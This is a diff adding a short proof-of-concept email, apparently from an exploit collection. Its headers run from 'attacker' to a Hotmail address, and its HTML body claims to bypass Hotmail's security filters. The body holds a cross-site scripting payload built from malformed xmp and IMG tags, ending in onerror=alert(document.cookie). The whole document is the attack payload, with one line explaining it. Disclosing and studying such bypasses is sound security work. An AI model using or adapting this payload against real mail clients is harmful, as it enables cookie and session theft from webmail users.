@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: hello
+To: victim@hotmail.com
+MIME-Version: 1.0
+Content-type: text/html
+
+By sending the following HTML content, it is possible to bypass Hotmail security filters and run JavaScript code on the client browser.<xmp><IMG src='test.gif&</xmp><IMG onerror=alert(document.cookie) src='><IMG src='><IMG src='test.gif&"">
